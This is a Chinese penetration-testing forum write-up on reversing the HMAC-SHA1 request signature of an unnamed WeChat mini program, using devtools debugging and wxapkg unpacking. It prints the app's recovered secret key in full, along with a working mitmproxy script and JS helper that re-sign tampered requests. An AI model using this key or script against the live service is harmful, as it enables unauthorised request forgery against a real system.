---
title: 小程序sign逆向和渗透两种思路，总有一款适合你
url: https://forum.butian.net/share/3815
source: 奇安信攻防社区
date: 2024-10-19
fetch_date: 2025-10-06T18:45:35.040609
---

# 小程序sign逆向和渗透两种思路，总有一款适合你

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 小程序sign逆向和渗透两种思路，总有一款适合你

* [渗透测试](https://forum.butian.net/topic/47)

解开微信devtools进行debug获取加密逻辑和还原js后硬逆，两种思路各有利弊

小程序sign逆向和渗透两种思路，总有一款适合你
========================
0x01 sign发现和排查思路
----------------
起因是在做小程序渗透的过程中，改了数据重新发包显示系统异常，数据包如下图所示，猜测可能是`signature`这行是sign校验，所以才会出现异常
![1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-ea1d97c4603a6c9952b45baa47eb7e2ab19ad236.png)
然后因为正常请求是显示的是`code无效`，且请求头中存在大量参数，于是为了排除干扰就开始依次修改请求头中的每一组值再发包，如果修改后发包显示系统异常，那就证明这个sign值校验跟这个请求头也有关，最后如下图所示，初步判断请求头中有四处`busi-timestamp`、`busi-noncestr`、`busi-appid`、`json请求体`、这四处变一下响应就变成了系统异常，所以盲猜`busi-signature`就是根据他们四个的值进行计算得来的
![2.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-725d97ef1fdf34c9965fd0b44bd65f4c0b144d57.png)
0x02 解开微信devtools进行debug获取加密逻辑
------------------------------
​ 接下来使用第一种方式进行破译sign校验，虽然这个方法非常简单，但是其实这个方式我并不推荐，因为它是需要解开微信小程序devtools，存在封号风险，所以如果要尝试一定要使用自己的微信小号、同时注意一定不要使用虚拟机！！！
​ 我这里远控我另一台电脑登录我的微信小号，工具地址：<https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python>
​ 打开微信后执行
```shell
WechatOpenDevTools-Python.exe -x
```
​ 成功打开devtools
![3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-b7a2c9d6fec68e2c1371c5f949a899a77182244f.png)
![4.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-97a0b68057bdd1cfeea68f0262b255bfd350a137.png)
然后我这里直接快捷键，全局搜索`busi-signature:`，但是发现其存在bug，进度条一直卡住，不过好在js文件也不多，我就挨个点进去单个js文件的去搜索，然后这里有个点比较坑，就是你一定要触发对应js功能，`Sources`才加载对应js，你才能搜到，一定要注意，最后在appContext--usr--appservice.app.js里面发现了熟悉的代码
![5.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-ceca54e3ad21b56549cbc3d6cccfca0344040fd8.png)
上图代码分析，首先要知道`busi-appID`是写死的后续不会改变，然后可以看到`busi-signature`的值是a，而a又是一个函数计算得到的，我们直接跟进这个函数，如下，可以看到它先创建个HMAC对象秘钥是t，然后对e进行了计算，这里直接debug
![6.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-799c213864c01c95899c6c5d31c79b3f8cbd2040.png)
debug后，我们将秘钥拿出来，这里秘钥我们直接获取到了，是`GZR3qIxxx`（其实我们可以看之前调用该函数那张图片，上方有个变量r，它其实就是秘钥，它的值是一堆值的想加之和，那个我之前也简单看了一眼都是字符串加在一块）
![7.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-6ce17820c5ad08a04f95d77ab7143e5ae1cfb017.png)
然后开始查看变量e，看着乱七八糟但实际上也很简单，分成四部分，第一部分就是请求体的json参数，第二部分就是请求头中的时间戳，第三部分就是请求头中的noncestr，第四部分就是请求地址了，然后字符串中间用`\n`拼接起来，就是最终的值e了
![8.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-a3f2a69915acab836246e159b971f41eefd091e3.png)
- - - - - -
0x03 还原js后硬逆
------------
​ 接下来的方式就比较头铁了，它不能debug，而是利用`wxapkg`还原出js然后硬逆，这种方式有一点好处就是不用担心封号风险，还原wxpakg的方式有很多，之前我都是手动找然后手动还原的，现在也是有师傅写了工具，非常简单：<https://github.com/wux1an/wxapkg>
​ 这个程序有一点就是它寻找微信的路径是默认路径，由于我的电脑微信的路径非默认路径，所以我改了下代码重新编译了下
```shell
wxapkg.exe scan
```
直接扫描，选择后回车直接解密
![9.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-0ac3ee52dd08f118d58b24ff893c1f9eabfa5227.png)
同理我这里也是从0开始，用vs code（当然你也可以用小程序开发者工具，看个人习惯）打开后全局搜`busi-signature:`，它在一个函数里面
![10.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-3ac3bd7d86b554fa9dfadc9b1f634a3774463416.png)
​ 把这个函数拿出来整理一下，如下，接下来我们挨个去分析，首先`busi-appId`这个是一个固定得值所以没什么好说的，然后`busi-timeStamp`就是时间戳这个也没什么好说的
![11.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-8c1fa00be02da1df4bb19f7a19749d8c7d4cece7.png)
​ 其次就是`busi-nonceStr`，其实有经验的就知道它是个随机字符串，`busi-signature`的计算依赖于noncestr，但是noncestr是什么其实没多大关系，接下来我们可以简单看一眼，`busi-nonceStr`怎么来的，代码在前面，我这里直接粘过来
![12.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-ef198279cff509f028159ad256c2681d23b5ec31.png)
​ 最重要的还是busi-signature，而它是根据函数encryptWithHmacSHA1计算出来的，这个函数有两个参数，我们先来看简单的r，也就是秘钥，r的赋值就在上方的语句中
![13.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-f65a8d56936fa12ed417cc09fc2b25960d22ec7a.png)
​ 归根结底也是一堆字符串的拼接，但是有个问题就是我们分别得找这些对象`c`、`l`、`f.k3`我们不知道这些对象是谁
```js
r = "".concat(c.k1).concat(l.k2).concat(f.k3.slice(2)).concat(c.k4),
```
​ 其实找他们也很简单，有一个便捷方法， 但是讲解便捷方法之前，我先硬扣一下k1和k4，而他们属于对象c，那么对象c在哪里呢，我们根据这个代码往前回溯，如下图之前分析的所有代码其实都隶属于`38`，而看到如下图所示的代码后，其实一眼看出这就是构建工具生成的代码，`38`代表38这个模块，而`C`的值其实也能看到是`n(39)`，所以可以知道n大概就是模块加载器，而我们想知道的c对象其实就是`39`这个模块
![14.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-71e1782898c81d8a5f7369c268d0d780ddbd756a.png)
所以我们直接搜索`39:`，至此k1和k4拿到
![15.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-afd389790a55313e14492c235d52d6aed511db35.png)
然后回想我们刚才的代码如下图，现在还剩下标红的两部分，那么这块我们就用我们上文中提到的简便思路，其实非常简单，直接搜索`k2 =`和`k3 =`
![16.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-3dca9403e1b7b3f50074e4b9c63f5fbbb3d02772.png)
k2如下
![17.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-a0bcf48db511a5dc8449552a9d5f145e43442d00.png)
k3如下
![18.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-5f5c422172ddf6641e1bfdfbd29eb6be58a40d32.png)
所以最后拼接得到秘钥（要注意k3用了slice(2)函数，取得是从索引为2位置开始的字符串）
```php
GZR3qIBe^lC@I!KpkyBtEg$&@0UncJpr
```
秘钥得到了，接下来就该研究，另一个参数n了，其实也很简单，把之前的图拿来，我们重点看红框部分
![19.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-89d7beff97509bfec430b723ec23879ab069de35.png)
为了更加直观，我把代码粘贴出来并修改了下格式，下方代码判断`t.method`是否是get，如果是get就按照第一行计算，如果不是就按照第二行计算，
![20.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-3063e3c1d406e955dde6c90b67093de0b33f457a.png)
```js
//这里判断如果t.metchod是get，这里t不能猜出就是当前http对象，n就等于后续的字符串相加，s通过上图可以看出是get请求中url的参数部分，d通过上上张图片可以得出是busi-timeStamp的值，y则是busi-nonceStr，后续又加上了请求中的去除参数的url部分
if (n = "get" == t.method ? (s || "") + "\n" + d + "\n" + y + "\na671602347467\n" + (t.url.includes("?") ? t.url.split("?")[0] : t.url) + "\n"
//这里类似，非get请求走的是下面的代码， 跟上面类似，唯一一个区别就是最开始的字符串是t.data，也就是post请求中的请求参数
: (JSON.stringify(t.data) || "") + "\n" + d + "\n" + y + "\na671602347467\n" + (t.url.includes("?") ? t.url.split("?")[0] : t.url) + "\n",
```
这里我们将参数n和r都拿到了，就剩`encryptWithHmacSHA1`函数还不知道，直接一搜就明了了，如下图
![21.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-9908bde002a772a75e5473514f02334e2e6b2191.png)
至此，我们把整体的逻辑通过js代码还原了出来
- - - - - -
0x04 利用
-------
这里提到利用的话，通常按照之前的习惯我肯定是用`mitmproxy`，代码如下，已经写好注释了
\*\*python代码（mitm\\_sign.py）\*\*
```python
import time
import execjs
#截获请求加密data，以及更新sign
def request(flow):
if flow.request.method == "POST":
# 加载js文件
with open('exec.js', 'r', encoding='utf-8') as f:
js\_file = f.read()
# 加载执行环境
js\_exec = execjs.compile(js\_file)
#获取json数据，不为空直接赋值，为空的话会抛异常那就手动赋值为空字符串
try:
json\_data = flow.request.json()
except Exception as e:
json\_data = ''
#url无参数
url = str(flow.request.path).split('?')[0]
#noncestr
noncestr = flow.request.headers.get('busi-nonceStr','')
#时间戳
now\_time = int(time.time())
sign = js\_exec.call('get\_sign',url,json\_data,noncestr,now\_time)
#更改时间戳和sign
flow.request.urlencoded\_form['busi-timeStamp'] = now\_time
flow.request.urlencoded\_form['busi-signature'] = sign
```
\*\*js代码（exec.js）\*\*
```js
const crypto = require('crypto');
secretKey = 'GZR3qIBe^lC@I!KpkyBtEg$&@0UncJpr'
function get\_sign(url,jsondata,noncestr,now\_time){
e = jsondata
+'\n'+now\_time
+ '\n'+noncestr
+ '\na671602347467'
+ '\n'+url
+ '\n'
const hmac = crypto.createHmac('sha1', secretKey);
hmac.update(e)
sign = hmac.digest("hex")
return sign
}
```
然后执行
```shell
mitmproxy.exe -p 8081 -s .\mitm\_sign.py
```
之后就可以随意发包了不用担心sign了
![22.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/09/attach-23cfd5a72f549e4668718b5ab7256635dbbd8970.png)
- - - - - -
0x05 结语
-------
公众号`小惜渗透`欢迎师傅们关注交流哈，另外这个文章等审核完后过些天也会同步，所以有过有想转发到公众号的师傅们等我微信投完原创再转发哈
像微信...